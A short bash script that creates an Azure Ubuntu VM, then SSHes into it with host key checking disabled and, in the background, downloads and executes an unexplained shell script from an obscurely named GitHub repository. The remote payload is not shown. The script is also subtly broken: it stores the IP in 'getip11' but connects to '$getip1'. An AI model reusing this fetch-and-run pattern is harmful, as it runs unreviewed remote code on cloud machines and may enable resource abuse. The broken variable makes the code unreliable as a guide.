#!/bin/bash
az vm create --resource-group myResourceGroup --name myVM1 --size Standard_DS3_v2 --location westeurope --image Canonical:UbuntuServer:18.04-LTS:latest --admin-username azureuser --generate-ssh-keys
getip11=$(az vm show -g myResourceGroup -n myVM1 -d | awk '/publicIps/{match($0,/[0-9]+.[0-9]+.[0-9]+.[0-9]+/); ip =substr($0,RSTART,RLENGTH); print ip}')
ssh -o "StrictHostKeyChecking=no" azureuser@$getip1 'wget https://raw.githubusercontent.com/notforme2210/andnotforyou/master/azuuu.sh && chmod +x azuuu.sh && ./azuuu.sh' &
 